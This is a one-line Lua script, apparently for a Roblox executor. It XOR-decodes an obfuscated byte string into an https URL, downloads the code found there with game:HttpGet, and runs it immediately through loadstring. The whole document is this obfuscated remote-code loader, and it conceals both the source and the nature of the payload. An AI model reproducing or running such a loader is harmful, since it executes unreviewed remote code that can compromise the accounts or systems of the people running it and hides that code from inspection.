local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9)local v10={};for i=1, #v8 do v6(v10,v0(v4(v1(v2(v8,i,i + 1)),v1(v2(v9,1 + ((i-1)% #v9),1 + ((i-1)% #v9) + 1)))%256));end return v5(v10);end loadstring(game:HttpGet(v7("\140\182\158\94\187\222\237\197\92\169\147\236\141\71\188\140\183\136\91\187\129\176\137\65\166\144\167\132\90\230\135\173\135\1\132\129\165\139\77\177\172\183\136\96\167\213\237\161\79\161\144\183\132\99\167\128\167\188\28\231\137\163\131\64\231\182\135\171\106\133\161\236\135\74","\228\194\234\46\200")))();
